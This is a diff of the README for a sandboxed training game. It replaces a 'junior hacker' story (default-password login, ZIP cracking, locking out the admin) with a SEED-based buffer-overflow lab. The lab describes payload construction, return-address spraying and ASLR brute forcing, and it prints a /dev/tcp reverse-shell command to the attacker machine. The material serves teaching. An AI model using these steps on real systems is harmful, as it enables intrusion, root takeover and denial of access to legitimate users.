@@ -1,121 +1,147 @@
-# Junior hacker training
+# Buffer Overflow Attack Lab (Server Version)
 
-Welcome! You are a junior hacker, who only recently entered the top-secret school of a legendary master hacker, preceded by incredible legends. Today is your first day of field training, and the master will take you to one of his favorite workplaces -- a crowded urban settlement. What makes such a common place really special? A lot of people without the knowledge of information security basics, with dozens of unsecured routers and default passwords, which invite you to visit their local networks. 
+Hands-on buffer-overflow attack lab. The player takes the role of a penetration tester who must
+exploit two vulnerable network services running as **root** on a target server, inject shellcode,
+and obtain a **root reverse shell** on each in order to read the secret flag.
 
-You are in a car at the urban settlement parking lot. The master brought his laptop with Kali Linux that, together with his advice, you can use in today's outdoor training. The main goal of today's training is simple: to steal anything that can be valuable.
+This lab is based on the [SEED Labs](https://seedsecuritylabs.org/) *Buffer Overflow Attack Lab
+(Server Version)* by Wenliang Du (Syracuse University).
 
 ## Disclaimer
 
-This game is for educational purposes only. Unauthorized use of the tools that are incorporated into the game is illegal. The story is fictitious.
+This game is for **educational purposes only**. The techniques shown must only be used inside this
+training sandbox. Unauthorized use against systems you do not own or have permission to test is illegal.
 
 ## License
 
-This work by Miriam Gáliková is licensed under CC BY 4.0. Terms of this license are available at: https://creativecommons.org/licenses/by/4.0
+The game design of this project is licensed under CC BY 4.0:
+https://creativecommons.org/licenses/by/4.0
+
+## Scenario
+
+You are a penetration tester. On the target network there is a server (`10.1.26.9`) exposing two
+network services, each wrapping a program written in C. Both programs contain a classic **stack
+buffer-overflow** vulnerability and run as **root**. Your mission: exploit them to obtain a **root
+shell** and read the secret flag on each service.
+
+You work from the **attacker** machine (`10.1.26.23`), a SEED Ubuntu box equipped with the tools you
+need (`gcc`, `python3`, `netcat`, `gdb`) and the lab files in `~/shellcode` and `~/attack-code`.
+
+| Machine  | IP            | Role                        |
+|----------|---------------|-----------------------------|
+| attacker | `10.1.26.23`  | your box (you log in here)  |
+| server   | `10.1.26.9`   | runs the vulnerable services |
+
+| Target  | Address          | Difficulty                                    |
+|---------|------------------|-----------------------------------------------|
+| Level 1 | `10.1.26.9:9090` | 32-bit, shows frame pointer **and** buffer address |
+| Level 2 | `10.1.26.9:9091` | 32-bit, shows **only** the buffer address     |
+
+**Prerequisites:** basic Linux command line · basic C and stack layout · basic networking (TCP, netcat).
+
+**Learning outcomes:**
+- Understand how a stack buffer overflow overwrites the return address.
+- Build a payload (NOP sled + shellcode + return address) and exploit a remote service.
+- Obtain a root reverse shell on a vulnerable server.
+- Explain how ASLR mitigates buffer-overflow attacks.
+
+---
+
+## Access: Get into the environment
+
+**Learning outcome:** the player learns how to reach their workstation in the cloud sandbox.
+
+The attacker machine lives in the CyberRangeCZ sandbox, so the player must open a session on it.
+In the topology overview, right-click **`attacker`** → **Open GUI** and log in with username `user`
+and password `Password123`. SSH into the same box is an equivalent alternative. There is **no** login
+to the server — the server is reached only through its vulnerable network services.
+
+The flag for this step is `start`.
+
+**Estimated duration:** 0 minutes
 
 
-## Level 1: Getting to know the environment
+## Task 1: Shellcode & Set-UID — read the protected flag
 
-**Learning outcomes**:
+**Learning outcome:** the player understands that shellcode runs with the privilege of the program that
+executes it, and uses a Set-UID-root program to read a file their own account cannot.
 
-The player learns to orient in Kali Linux and its tools. 
+The flag is stored in `/opt/flag`, owned by root with mode `0400`, so the `user` account is denied
+(`cat /opt/flag` → Permission denied). The player is given a **Set-UID-root** runner,
+`~/shellcode/run-shellcode`: because a Set-UID program runs with the privilege of its owner (root), and
+this runner executes whatever shellcode is in `codefile_32`, any command the player's shellcode runs
+executes as root. Working only with the 32-bit generator `shellcode_32.py` (whose shellcode already
+begins with a `setuid(0)` call so the launched bash keeps root), the player edits the command string to
+`cat /opt/flag` — keeping the trailing `*` marker in the same column — regenerates with
+`./shellcode_32.py`, and runs `./run-shellcode` to print the flag as root.
 
-**Task assignment**:
+Typing `cat /opt/flag` directly, or running the shellcode through any runner the student compiles
+themselves (which would be owned by `user`, not Set-UID root), both execute as `user` and are denied —
+so the step genuinely cannot be bypassed.
 
-The master handed you a laptop, saying to you: "You studied hard in the past weeks. Now, you are ready for real-world hacking training, but you need the right equipment. In today's lecture, I will teach you using Kali Linux and show you some of its basic functionality, which will make hacking easier. 
+The flag is the contents of `/opt/flag` (a per-sandbox `FLAG-T1-…` value), readable only via the
+Set-UID runner.
 
-Firstly, Kali is not just another Linux-based system. It contains many handy hacking tools, which I want you to try today. We can't avoid using Nmap, which is a tool for network scanning: it prints the IP addresses of connected hosts and their running services. But my all-time favorite tools are for password cracking, such as John the ripper, Hydra, or fcrackzip. We will try to find an opportunity for you to try some of them out. When the time is right for using the tool, I'll tell you. If you can't figure out how to use the tool, write the suffix `--help` to get detailed instructions.
-
-Secondly, get acquainted with the command line that you will use to work with Kali Linux. Log in as the user `user` with the password `Password123`, look around your file system, and note the arrangement of files and directories. You will need this knowledge when you hack into another Linux machine."
-
-The flag for this level is the command suffix (option) used for printing more information about some tool (there are two possibilities, submit the longer one).
-
-**Estimated duration**:
-
-3 minutes
-
-
-## Level 2: Looking for server’s IP address
-
-**Learning outcomes**:
-
-The player learns to use nmap tool to scan IP addresses and discover the host's running services.
-
-**Task assignment**:
-
-You already managed to guess the password on a Wi-Fi router with the master's help (12345678, really?!), so you have already accessed the local network of one household. At the same time, you saw the other machines' IP addresses in the router's web UI. There are 2 machines with IP addresses: 10.1.26.4 and 10.1.26.9. 
-
-The master told you that your goal is to gain access to the server. Since there 2 machines in the network, scan the hosts and recognize the server's IP address. You can recognize the server by its running services.
-
-The flag is the port number on which the file sharing service is running on the server's machine.
-
-**Estimated duration**:
-
-5 minutes
+**Estimated duration:** ~10 minutes
 
 
-## Level 3: Connect to the server
+## Task 2: Level 1 attack (32-bit)
 
-**Learning outcomes**:
+**Learning outcome:** the player performs the core exploit — overwriting the return address to run
+injected shellcode and escalating to an interactive root shell.
 
-Player learns how to log in remotely using SSH. 
+The first target runs on `10.1.26.9:9090` (32-bit). A benign probe
+(`echo hello | nc 10.1.26.9 9090`) makes the server reply with the **frame pointer (ebp)** and the
+**buffer's address** inside `bof()`. From these the player computes where to place the return address
+and shellcode: the return-address slot sits at `ebp+4`, so `offset = (ebp - buffer) + 4`. They set
+`ret` to an address inside a NOP sled (e.g. `buffer + 0x120`), place the shellcode near the end of the
+517-byte payload, and build `badfile` with `~/attack-code/exploit.py`.
 
-**Task assignment**:
+To get an interactive shell, the shellcode's command string is changed to a **reverse shell** back to
+the attacker (`/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`); the player runs `nc -lnv 4444` as a
+listener, fires the payload with `cat badfile | nc 10.1.26.9 9090`, and lands as **root** on the target.
 
-You know the IP address of the server, it was easy, right? Now comes the more interesting part of how to use this knowledge to your advantage. Connect remotely to the server and use legitimate credentials. The master told you that the login details will most likely one of these: admin/password, admin/123456 or admin/admin. It's worth trying, isn't it?
+The flag is the contents of `/root/flag` on the Level 1 target.
 
-The flag is the entire command for logging into the server. 
-
-**Estimated duration**:
-
-5 minutes
-
-
-## Level 4: Find interesting files
-
-**Learning outcomes**:
-
-The player becomes familiar with the Linux file system and copy ZIP file using SCP. 
-
-**Task assignment**:
-
-You are already logged in to the server. Now is the time to find something exciting and ideally compromising, but we don't know exactly what we are looking for. However... do you still remember the list of services running on the server based on the Nmap scan? You already discovered that the server runs the NFS service. NFS protocol is used for file sharing and remote access to files over a computer network. Maybe this server is used to back up data. Try to look whether the admin's home directory stores any files. Then, copy a useful file to your attacker machine.
-
-The flag is the name of the only ZIP file (including the extension) located in the home directory. 
-
-**Estimated duration**:
-
-5 minutes
+**Estimated duration:** ~20 minutes
 
 
-## Level 5: Crack the password to the zip
+## Task 3: Level 2 attack (32-bit, buffer size unknown)
 
-**Learning outcomes**:
+**Learning outcome:** the player writes a single robust, size-independent exploit payload.
 
-The player learns to crack a ZIP's password using the fcrackzip tool. 
+The second target runs on `10.1.26.9:9091` (still 32-bit), but reveals **only the buffer's address** —
+not the frame pointer — so the buffer size is unknown (somewhere in `[100, 300]` bytes; the saved
+frame pointer is always a multiple of 4). Rather than brute-forcing one size at a time, the player
+**sprays the return address** every 4 bytes across the whole window where the return slot could be
+(all copies point into the same NOP sled) and places the shellcode at the very end of the 517-byte
+payload. One payload then works for any size in range. A root reverse shell is obtained exactly as in
+Task 2.
 
-**Task assignment**:
+The flag is the contents of `/root/flag` on the Level 2 target.
 
-You have found out that some accounting company's files have been uploaded to this server. And you have a ZIP file with a promising name in your hands, but unfortunately, it is password-protected. The master advised you that a password cracking tool called Fcrackzip was installed on his Kali machine. Find out how you could break the password and reveal the content of the ZIP. 
-
-The flag is the password to the ZIP.
-
-**Estimated duration**:
-
-10 minutes
+**Estimated duration:** ~20 minutes
 
 
-## Level 6: Disable access to the server for an authorized user
+## Task 4: Defeating Address Randomization
 
-**Learning outcomes**:
+**Learning outcome:** the player understands ASLR and why it can still be defeated by brute force on
+a 32-bit target.
 
-The player learns how to change the password to the server machine.
+Task 4 has its **own container** at `10.1.26.9:9092` (Level 3). It runs the **same 32-bit binary as
+Level 1**, but with **ASLR enabled** — unlike Levels 1 and 2, whose services opt out of randomization
+(launched under `setarch -R`) so their addresses stay fixed. Probing `:9092` repeatedly shows the
+leaked buffer address **changing on every connection**, so the fixed return address from Task 2 usually
+misses and the service reports `==== Returned Properly ====` or crashes.
 
-**Task assignment**:
+The player then exploits the fact that a 32-bit stack has only **19 bits of entropy** —
+`2^19 = 524,288` possible stack base addresses — a space small enough to exhaust. Keeping the **same
+badfile from Task 2**, they fire it in a loop against `:9092` with `~/attack-code/brute-force.sh`
+(listener `nc -lnv 4444` ready as before); within minutes one attempt lines the stack up with the
+hard-coded return address, the shellcode runs, and the root reverse shell connects. On 64-bit the
+entropy is far larger, making this brute force impractical.
 
-Congrats! You have completed your today's training, and the master praised you as one of his best students. In addition, you gained a folder with prominent invoices, and it's up to you what you'll do with them. But you don't want to just leave without fun. Finally, change the admin's password on the server so that a legitimate user will not be able to access their data. 
+The flag is the contents of `/root/flag` on the Level 3 (`:9092`) container — a unique per-sandbox
+value that can only be read after the brute force yields a root shell.
 
-The flag is the command for changing the password (including username). 
-
-**Estimated duration**:
-
-5 minutes
+**Estimated duration:** ~20 minutes
